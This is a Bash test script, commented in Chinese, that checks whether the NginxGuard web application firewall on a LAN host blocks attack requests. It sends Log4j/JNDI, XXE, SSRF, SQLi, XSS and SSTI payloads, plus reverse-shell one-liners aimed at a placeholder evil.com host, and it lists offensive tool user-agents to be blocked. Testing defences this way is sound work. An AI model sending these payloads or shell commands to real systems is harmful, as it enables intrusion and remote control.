#!/bin/bash
# NginxGuard 全功能覆盖测试 — 补充 waf_full_test.sh 未覆盖的盲区
# 测试目标: 192.168.2.180 (NginxGuard on port 80)
# 覆盖: 编码绕过、Log4j/JNDI、XXE、PHP伪协议、云元数据、reverse-shell、
#        参数名攻击、POST JSON、空cdnip.rule、黑名单IP、动态黑名单、
#        双扩展名绕过、Referer开启、HTTP方法、多参数注入

TARGET="http://192.168.2.180"
SSH180="ssh 192.168.2.180"
NGINX_CMD="cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf"
WAF_CONFIG="/opt/nginx/lua/waf/config.lua"
PASS=0; FAIL=0; TOTAL=0; ERRORS=""
RESULTS="/tmp/waf_coverage_test.txt"
> $RESULTS
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo "[$(date '+%H:%M:%S')] $*" | tee -a $RESULTS; }
ok()   { echo -e "  ${GREEN}PASS${NC}  $1  (HTTP $2)" | tee -a $RESULTS; PASS=$((PASS+1)); TOTAL=$((TOTAL+1)); }
bad()  { echo -e "  ${RED}FAIL${NC}  $1  (got $2, want $3)" | tee -a $RESULTS; FAIL=$((FAIL+1)); TOTAL=$((TOTAL+1)); ERRORS="$ERRORS\n  $1: got $2, want $3"; }

test_rule() {
    local name="$1"; local expect="$2"; shift 2
    local actual=$(curl --globoff -s -m 10 -o /dev/null -w "%{http_code}" "$@" 2>/dev/null)
    if [ "$actual" = "$expect" ]; then ok "$name" "$actual"; else bad "$name" "$actual" "$expect"; fi
}
set_config() { $SSH180 "sed -i \"s|^config_$1 = .*|config_$1 = \\\"$2\\\"|\" $WAF_CONFIG"; }
restart_nginx() { $SSH180 "kill -TERM \$(cat /opt/nginx/logs/nginx.pid) 2>/dev/null; sleep 1; cd /opt/nginx && ./nginx -p /opt/nginx/ -c conf/nginx.conf 2>&1"; sleep 2; }
reload_nginx() { $SSH180 "$NGINX_CMD -s reload 2>&1"; sleep 3; }

echo "========================================" | tee -a $RESULTS
echo "  NginxGuard 全功能覆盖测试" | tee -a $RESULTS
echo "  目标: $TARGET" | tee -a $RESULTS
echo "  时间: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a $RESULTS
echo "  补充: 编码绕过/Log4j/XXE/PHP伪协议/云元数据/reverse-shell" | tee -a $RESULTS
echo "         参数名/JSON/空cdnip/黑名单IP/动态黑名单/双扩展名/Referer/HTTP方法" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS

# 预处理: 重启 + 关闭 CC
restart_nginx
set_config "cc_check" "off"
sleep 3
$SSH180 "$NGINX_CMD -s reload 2>&1"
sleep 2

# ============================================================
# 1. 编码绕过测试
# ============================================================
echo -e "\n${CYAN}=== 1. 编码绕过测试 ===${NC}" | tee -a $RESULTS

echo -e "${YELLOW}  --- 双重URL编码 ---${NC}" | tee -a $RESULTS
# %252e%252e%252f = double-encoded ../
test_rule "Double-encode ../" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?file=%252e%252e%252fetc%252fpasswd"
# %253C%2573cript = double-encoded <script>
test_rule "Double-encode <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%253C%2573cript%253Ealert(1)%253C%252fscript%253E"

echo -e "${YELLOW}  --- JS Unicode/Hex 解码 ---${NC}" | tee -a $RESULTS
# \u003c = <, \u003e = >
test_rule "JS unicode <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
# \x3c = <, \x3e = >
test_rule "JS hex <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
# &#x3c; = <, &#x3e; = >
test_rule "HTML hex entity <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%26%23x3c;script%26%23x3e;alert(1)%26%23x3c;/script%26%23x3e;"
# &#60; = <, &#62; = >
test_rule "HTML decimal entity <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%26%2360;script%26%2362;alert(1)%26%2360;/script%26%2362;"

echo -e "${YELLOW}  --- 混合编码 SQL 注入 ---${NC}" | tee -a $RESULTS
# union select with URL encoding
test_rule "Mixed encode union select" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+%75nion+%73elect+1"
# sleep with double encoding
test_rule "Double encode sleep()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=%2573leep(5)"

# ============================================================
# 2. Log4j / JNDI 注入
# ============================================================
echo -e "\n${CYAN}=== 2. Log4j / JNDI 注入 ===${NC}" | tee -a $RESULTS
# Log4j payloads contain $ which must be single-quoted to prevent shell expansion
# Using URL-encoded %24 to bypass shell $ expansion
test_rule "Log4j basic jndi" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Bjndi:ldap://evil.com/a%7D"
test_rule "Log4j lower" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Bjndi:%24%7Blower:%7Dldap://evil.com/a%7D"
test_rule "Log4j upper" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Bjndi:%24%7Bupper:%7DLDAP://evil.com/a%7D"
test_rule "Log4j env" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Benv:ENV_NAME:-default%7D"
test_rule "Log4j sys" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Bsys:sys.property%7D"
test_rule "Log4j ::-" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7Bjndi:%24%7B::-ldap%7D://evil.com/a%7D"
test_rule "Log4j in Header" 403 -H "User-Agent: Mozilla/5.0" -H 'X-Api-Version: ${jndi:ldap://evil.com}' "$TARGET/"
test_rule "Log4j in POST" 403 -H "User-Agent: Mozilla/5.0" -d 'q=${jndi:ldap://evil.com/a}' "$TARGET/"

# ============================================================
# 3. XXE 注入
# ============================================================
echo -e "\n${CYAN}=== 3. XXE 注入 ===${NC}" | tee -a $RESULTS
test_rule "XXE <!ENTITY>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E"
test_rule "XXE <!DOCTYPE>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C!DOCTYPE%20foo%20SYSTEM%20%22http://evil.com%22%3E"
test_rule "XXE CDATA" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C![CDATA[test]]%3E"
test_rule "XXE POST entity" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/xml" -d '<!ENTITY xxe SYSTEM "file:///etc/passwd">' "$TARGET/"
test_rule "XXE POST DOCTYPE" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/xml" -d '<!DOCTYPE foo SYSTEM "http://evil.com">' "$TARGET/"

# ============================================================
# 4. PHP 伪协议
# ============================================================
echo -e "\n${CYAN}=== 4. PHP 伪协议 ===${NC}" | tee -a $RESULTS
test_rule "PHP php://filter" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=php://filter/convert.base64-encode/resource=index.php"
test_rule "PHP php://input" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=php://input"
test_rule "PHP zip://" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=zip://test.zip%23shell.php"
test_rule "PHP phar://" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=phar://test.phar/shell.php"

# ============================================================
# 5. 云元数据探测
# ============================================================
echo -e "\n${CYAN}=== 5. 云元数据探测 ===${NC}" | tee -a $RESULTS
test_rule "AWS metadata 169.254.169.254" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=169.254.169.254/latest/meta-data/"
test_rule "AWS metadata computeMetadata" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=169.254.169.254/computeMetadata/v1/"
test_rule "GCP metadata.google.internal" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=metadata.google.internal/computeMetadata/v1/"
test_rule "Azure metadata fd00:ec2::254" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=fd00:ec2::254/latest/meta-data/"
test_rule "Azure metadata metadata.azure.com" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=metadata.azure.com/metadata/instance?api-version=2021-02-01"
test_rule "Localhost 127.0.0.1 SSRF" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=http://127.0.0.1:8080/admin"
test_rule "Localhost localhost SSRF" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=http://localhost:8080/admin"

# ============================================================
# 6. Reverse Shell 模式
# ============================================================
echo -e "\n${CYAN}=== 6. Reverse Shell 检测 ===${NC}" | tee -a $RESULTS
test_rule "Reverse shell bash -i" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=bash+-i+>%26+/dev/tcp/evil.com/443+0>%261"
test_rule "Reverse shell sh -i" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=sh+-i+>%26+/dev/udp/evil.com/443+0>%261"
test_rule "Reverse shell nc -e" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=nc+-e+/bin/bash+evil.com+443"
test_rule "Reverse shell ncat -e" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=ncat+-e+/bin/sh+evil.com+443"
test_rule "Reverse shell mkfifo" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=mkfifo+/tmp/p;cat+/tmp/p|/bin/sh+-i+2>%261|nc+evil.com+443>/tmp/p"
test_rule "Reverse shell /dev/tcp/" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=/dev/tcp/evil.com/443"
test_rule "Reverse shell /dev/udp/" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=/dev/udp/evil.com/443"
test_rule "Reverse shell POST" 403 -H "User-Agent: Mozilla/5.0" -d "cmd=bash -i >& /dev/tcp/evil.com/443 0>&1" "$TARGET/"

# ============================================================
# 7. 更多白名单 UA
# ============================================================
echo -e "\n${CYAN}=== 7. 更多白名单 UA 放行 ===${NC}" | tee -a $RESULTS
for ua in "Sogou web spider" "360Spider" "Bytespider" "YandexImages" "Applebot" \
          "facebookexternalhit" "Twitterbot" "LinkedInBot" "Slackbot" "Discordbot" \
          "TelegramBot" "AhrefsBot" "SemrushBot" "DotBot" "MJ12bot" \
          "ClaudeBot" "ChatGPT-User" "OAI-SearchBot" "PerplexityBot" "meta-externalagent" \
          "ExaSearchBot" "Sogou Pic Spider" "Googlebot-Image" "Googlebot-Video" \
          "Googlebot-News" "AdsBot-Google" "Google-Extended" "Mediapartners-Google" \
          "BingPreview" "Baiduspider-image" "Baiduspider-render" "Baiduspider-video" \
          "YandexMetrika" "Facebot" "WhatsApp"; do
    test_rule "WhiteUA: $ua" 200 -A "$ua" "$TARGET/"
done

# ============================================================
# 8. 参数名（key）攻击
# ============================================================
echo -e "\n${CYAN}=== 8. 参数名攻击检测 ===${NC}" | tee -a $RESULTS
# 参数名本身包含攻击payload
test_rule "Param name union select" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?union+select+1=1"
test_rule "Param name <script>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?<script>alert(1)</script>=1"
test_rule "Param name sleep()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?sleep(5)=1"
test_rule "Param name system()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?system(ls)=1"
test_rule "Param name eval()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?eval(0)=1"

# ============================================================
# 9. POST JSON body 攻击
# ============================================================
echo -e "\n${CYAN}=== 9. POST JSON body 攻击 ===${NC}" | tee -a $RESULTS
test_rule "JSON SQL union" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"id":"1 union select 1"}' "$TARGET/"
test_rule "JSON XSS script" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"<script>alert(1)</script>"}' "$TARGET/"
test_rule "JSON system()" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"cmd":"system(ls)"}' "$TARGET/"
test_rule "JSON SSTI" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"x":"{{__class__}}"}' "$TARGET/"
test_rule "JSON Log4j" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"${jndi:ldap://evil.com}"}' "$TARGET/"

# ============================================================
# 10. 空 cdnip.rule 回落行为
# ============================================================
echo -e "\n${CYAN}=== 10. 空 cdnip.rule 回落行为 ===${NC}" | tee -a $RESULTS
# 备份当前 cdnip.rule, 替换为全注释文件
$SSH180 "cp /opt/nginx/lua/waf/rule-config/cdnip.rule /opt/nginx/lua/waf/rule-config/cdnip.rule.bak2 2>/dev/null"
$SSH180 "echo '# all commented' > /opt/nginx/lua/waf/rule-config/cdnip.rule"
sleep 12
reload_nginx
sleep 2
# 空规则应回落原始行为 = 信任所有 XFF
code=$(curl --globoff -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.8.8" "$TARGET/?id=union+select")
if [ "$code" = "200" ]; then ok "空cdnip.rule: XFF白名单IP放行" "$code"; else bad "空cdnip.rule: XFF白名单IP" "$code" "200"; fi
code=$(curl --globoff -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 1.2.3.4" "$TARGET/?id=union+select")
if [ "$code" = "403" ]; then ok "空cdnip.rule: XFF非白名单IP+SQLi拦截" "$code"; else bad "空cdnip.rule: XFF非白名单IP+SQLi" "$code" "403"; fi
# 恢复
$SSH180 "mv /opt/nginx/lua/waf/rule-config/cdnip.rule.bak2 /opt/nginx/lua/waf/rule-config/cdnip.rule 2>/dev/null"
sleep 3
reload_nginx

# ============================================================
# 11. 黑名单 IP 测试
# ============================================================
echo -e "\n${CYAN}=== 11. 黑名单 IP 测试 ===${NC}" | tee -a $RESULTS
# 临时添加黑名单 IP
$SSH180 "echo '6.6.6.6' > /opt/nginx/lua/waf/rule-config/blackip.rule"
sleep 3
reload_nginx
# 用 XFF 模拟黑名单 IP
code=$(curl --globoff -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 6.6.6.6" "$TARGET/")
if [ "$code" = "403" ]; then ok "黑名单IP 6.6.6.6 拦截" "$code"; else bad "黑名单IP 6.6.6.6" "$code" "403"; fi
# 非黑名单 IP 正常
code=$(curl --globoff -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 7.7.7.7" "$TARGET/")
if [ "$code" = "200" ]; then ok "非黑名单IP 7.7.7.7 放行" "$code"; else bad "非黑名单IP 7.7.7.7" "$code" "200"; fi
# 恢复空黑名单
$SSH180 "echo '' > /opt/nginx/lua/waf/rule-config/blackip.rule"
sleep 3
reload_nginx

# ============================================================
# 12. 动态黑名单（CC 自动拉黑后续请求）
# ============================================================
echo -e "\n${CYAN}=== 12. 动态黑名单（CC 自动拉黑后续请求）===${NC}" | tee -a $RESULTS
set_config "cc_check" "on"
set_config "cc_rate" "10/60"
set_config "cc_block_ttl" "300"
reload_nginx
log "发送 15 个请求触发 CC (cc_rate=10/60, block_ttl=300)"
BANNED=0
for i in $(seq 1 15); do
    CODE=$(curl --globoff -s -m 3 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
    [ "$CODE" = "403" ] && BANNED=$((BANNED+1))
done
if [ "$BANNED" -gt 0 ]; then ok "CC触发并拦截 $BANNED 次" "403"; else bad "CC未触发" "0" "403"; fi
# 验证后续请求也被拦截（动态黑名单）
code=$(curl --globoff -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/")
if [ "$code" = "403" ]; then ok "动态黑名单后续请求拦截" "$code"; else bad "动态黑名单后续请求" "$code" "403"; fi
# 恢复
set_config "cc_check" "off"
set_config "cc_rate" "150/60"
set_config "cc_block_ttl" "600"
restart_nginx

# ============================================================
# 13. 文件上传双扩展名绕过
# ============================================================
echo -e "\n${CYAN}=== 13. 文件上传双扩展名 ===${NC}" | tee -a $RESULTS
echo -e "${YELLOW}  --- 应拦截 ---${NC}" | tee -a $RESULTS
for ext in "php.jpg.php" "php.png.phar" "test.php5" "test.phtml" "test.phar" "test.pht" \
           "shell.php.jpg" "test.cgi" "test.pl" "test.py" "test.rb" "test.lua" \
           "test.sh" "test.bash" "test.zsh" "test.bat" "test.cmd" "test.ps1" \
           "test.sql" "test.htaccess" "test.env" "test.ini" "test.conf" \
           "test.pem" "test.key" "test.crt" "test.p12" "test.kube"; do
    echo "x" | ssh 192.168.2.180 "cat > /tmp/test.$ext"
    code=$(ssh 192.168.2.180 "curl --globoff -s -m 5 -o /dev/null -w '%{http_code}' -H 'User-Agent: Mozilla/5.0' -F 'file=@/tmp/test.$ext' http://127.0.0.1:80/")
    if [ "$code" = "403" ]; then ok "Upload .$ext" "$code"; else bad "Upload .$ext" "$code" "403"; fi
done

echo -e "${YELLOW}  --- 应放行 ---${NC}" | tee -a $RESULTS
for ext in "jpg" "png" "gif" "pdf" "txt" "doc" "xls" "mp3" "mp4" "css" "js" "html"; do
    echo "x" | ssh 192.168.2.180 "cat > /tmp/test.$ext"
    code=$(ssh 192.168.2.180 "curl --globoff -s -m 5 -o /dev/null -w '%{http_code}' -H 'User-Agent: Mozilla/5.0' -F 'file=@/tmp/test.$ext' http://127.0.0.1:80/")
    if [ "$code" != "403" ]; then ok "Upload .$ext pass" "$code"; else bad "Upload .$ext" "$code" "non-403"; fi
done

# ============================================================
# 14. Referer 检测开启
# ============================================================
echo -e "\n${CYAN}=== 14. Referer 检测开启 ===${NC}" | tee -a $RESULTS
set_config "referer_check" "on"
reload_nginx
test_rule "Referer .pay. blocked" 403 -H "User-Agent: Mozilla/5.0" -e "http://evil.pay.com/" "$TARGET/"
test_rule "Referer .alipay. blocked" 403 -H "User-Agent: Mozilla/5.0" -e "http://evil.alipay.com/" "$TARGET/"
test_rule "Referer .paypal. blocked" 403 -H "User-Agent: Mozilla/5.0" -e "http://evil.paypal.com/" "$TARGET/"
test_rule "Referer .stripe. blocked" 403 -H "User-Agent: Mozilla/5.0" -e "http://evil.stripe.com/" "$TARGET/"
test_rule "Normal referer pass" 200 -H "User-Agent: Mozilla/5.0" -e "http://www.google.com/" "$TARGET/"
test_rule "No referer pass" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/"
# 恢复
set_config "referer_check" "off"
reload_nginx

# ============================================================
# 15. HTTP 方法测试
# ============================================================
echo -e "\n${CYAN}=== 15. HTTP 方法测试 ===${NC}" | tee -a $RESULTS
test_rule "GET normal" 200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
test_rule "HEAD normal" 200 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/"
# OPTIONS on static root returns 405 (not 200), WAF still passes it through
test_rule "OPTIONS normal" 405 -H "User-Agent: Mozilla/5.0" -X OPTIONS "$TARGET/"
test_rule "GET with SQLi" 403 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/?id=1+union+select"
test_rule "HEAD with SQLi" 403 -H "User-Agent: Mozilla/5.0" -X HEAD "$TARGET/?id=1+union+select"

# ============================================================
# 16. 多参数注入
# ============================================================
echo -e "\n${CYAN}=== 16. 多参数注入 ===${NC}" | tee -a $RESULTS
# 多个参数中只有一个是攻击
test_rule "Multi-param: 2nd is SQLi" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=123&name=union+select+1"
test_rule "Multi-param: 1st is XSS" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=<script>alert(1)</script>&id=123"
test_rule "Multi-param: 3rd is CMD" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?a=1&b=2&c=system(ls)"
test_rule "Multi-param: all normal" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?a=1&b=2&c=3&d=hello"

# ============================================================
# 17. data: 协议注入
# ============================================================
echo -e "\n${CYAN}=== 17. data: 协议注入 ===${NC}" | tee -a $RESULTS
test_rule "data:text/html" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=data:text/html,<script>alert(1)</script>"
test_rule "data:application/x-javascript" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=data:application/x-javascript,alert(1)"
test_rule "data:// text" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=data://text/plain,base64,aGVsbG8="

# ============================================================
# 18. 其他 args.rule 规则覆盖
# ============================================================
echo -e "\n${CYAN}=== 18. 其他 args.rule 规则 ===${NC}" | tee -a $RESULTS
test_rule "SQL @@version" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=@@version"
test_rule "SQL @@hostname" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=@@hostname"
test_rule "SQL @@datadir" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=@@datadir"
test_rule "SQL xp_cmdshell" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=xp_cmdshell('dir')"
test_rule "SQL sp_password" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=sp_password"
test_rule "SQL sp_adduser" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=sp_adduser('admin','pass')"
test_rule "SQL exec xp_" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=exec+xp_cmdshell"
test_rule "SQL exec sp_" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=exec+sp_adduser"
test_rule "SQL CAST AS" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=CAST(1+AS+CHAR)"
test_rule "SQL CONVERT USING" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=CONVERT(1+USING+utf8)"
test_rule "SQL chr()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=chr(65,66)"
test_rule "SQL 0x hex" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=select+0x414141"
test_rule "SQL gtid_subset" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=gtid_subset"
test_rule "SQL gtid_extract" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=gtid_extract"
test_rule "JS eval()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=eval(alert(1))"
test_rule "JS setTimeout()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=setTimeout(alert,1000)"
test_rule "JS setInterval()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=setInterval(alert,1000)"
test_rule "JS atob()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=atob('cGhwaW5mbw==')"
test_rule "JS btoa()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=btoa('test')"
test_rule "JS decodeURIComponent()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=decodeURIComponent('%3Cscript%3E')"
test_rule "JS encodeURIComponent()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=encodeURIComponent('<script>')"
test_rule "JS function()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=function(){alert(1)}"
test_rule "JS fromCharCode" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=String.fromCharCode(65)"
test_rule "PHP phpinfo()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=phpinfo()"
test_rule "PHP php_uname()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=php_uname()"
test_rule "PHP getenv()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=getenv('PATH')"
test_rule "PHP getcwd()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=getcwd()"
test_rule "PHP ini_set()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=ini_set('display_errors',1)"
test_rule "PHP error_log()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=error_log('test')"
test_rule "PHP file_put_contents()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=file_put_contents('test.php','x')"
test_rule "PHP fwrite()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=fwrite('test','data')"
test_rule "PHP fread()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=fread('test',100)"
test_rule "PHP chmod()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=chmod('/tmp/file',0777)"
test_rule "PHP move_uploaded_file()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=move_uploaded_file('/tmp/file','/var/www/html/shell.php')"
test_rule "XPath expression()" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=expression('test')"
test_rule "__proto__" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=__proto__[test]"
test_rule "constructor[]" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=constructor[test]"
test_rule "script:[] injection" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=script:[alert(1)]"
test_rule "javascript:[] injection" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=javascript:[alert(1)]"
# MongoDB operators use $ which must be URL-encoded to avoid shell expansion
test_rule 'MongoDB \$func' 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24func(1)"
test_rule 'MongoDB \$expr' 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24expr(1)"
test_rule 'MongoDB \$accumulator' 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24accumulator(1)"

# ============================================================
# 19. GraphQL __schema / __type
# ============================================================
echo -e "\n${CYAN}=== 19. GraphQL 注入 ===${NC}" | tee -a $RESULTS
test_rule "GraphQL __schema" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=__schema"
test_rule "GraphQL __type" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=__type"

# ============================================================
# 20. SSTI 模板注入补充
# ============================================================
echo -e "\n${CYAN}=== 20. SSTI 模板注入补充 ===${NC}" | tee -a $RESULTS
test_rule "SSTI #{inject}" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%23{1+1}"
# SSTI ${} uses $ which must be URL-encoded
test_rule 'SSTI \${inject}' 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%24%7B1*1%7D"
test_rule "SSTI <%jsp%>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C%25test%25%3E"
test_rule "SSTI <%=erb%>" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C%25=test%25%3E"
test_rule "SSTI {*smarty*}" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%7B*test*%7D"
test_rule "SSTI [[inject]]" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%5B%5Btest%5D%5D"
test_rule "SSTI <#assign" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C%23assign"
test_rule "SSTI <#if" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C%23if"
test_rule "SSTI <#include" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%3C%23include"

# ============================================================
# 21. 更多 User-Agent 检测
# ============================================================
echo -e "\n${CYAN}=== 21. 更多 User-Agent 检测 ===${NC}" | tee -a $RESULTS
for ua in "HTTrack" "harvest" "pangolin" "hydra" "BBBike" "sqln" "w3af" "owasp" \
          "fimap" "havij" "PycURL" "zmeu" "BabyKrokodil" "netsparker" "httperf" \
          "Siege" "wrk" "hey" "vegeta" "k6" "gatling" "tsung" "locust" "boom" \
          "WebVulnScan" "Paros" "WebInspect" "WebScarab" "dotDefender" "Arachni" \
          "Skipfish" "Wapiti" "WhatWeb" "dirmap" "Naabu" "subfinder" "amass" \
          "ZGrab" "ZMap" "Shodan" "Censys" "Sn1per" "wpscan" "joomscan" \
          "droopescan" "CMSeek" "Osmedeus" "theHarvester" "sherlock" "Th3inspector" \
          "Awvs" "Nessus" "OpenVAS" "Greenbone" "Nexpose" "Rapid7" "Tenable" \
          "CobaltStrike" "Empire" "Mimikatz" "BloodHound" "Rubeus" "WinPEAS" \
          "LinPEAS" "LaZagne" "CrackMapExec" "Impacket" "Responder" "Inveigh" \
          "Fiddler" "Charles" "Postman" "archiver" "MySQLMAN" "DTSN" "absinthe" \
          "OSSTMM" "Brutus" "Caveman" "CursedGoogle" "WinHTTrack" "WebRipper" \
          "WebStripper" "SiteSucker" "SiteCopier" "PageNest" "BlackWidow" \
          "Teleport" "Offline Explorer" "Offline Navigator" "GetWeb" \
          "W3C_Validator" "Jigsaw" "netcraft" "w3m" "lynx" "ELinks" \
          "libwww-perl" "WinHTTP" "MacOutlook" "Indy" "DBM" "HCDM"; do
    test_rule "UA: $ua" 403 -A "$ua" "$TARGET/"
done

# ============================================================
# 22. 正常请求不应误报
# ============================================================
echo -e "\n${CYAN}=== 22. 正常请求不误报 ===${NC}" | tee -a $RESULTS
test_rule "Normal: hello world" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=hello+world"
test_rule "Normal: test123" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=123"
test_rule "Normal: email format" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?email=test@example.com"
test_rule "Normal: date param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?date=2026-08-19"
test_rule "Normal: page param" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?page=1&size=20"
test_rule "Normal: search" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?search=hello+world+test"
test_rule "Normal: callback url" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?callback=myFunction"
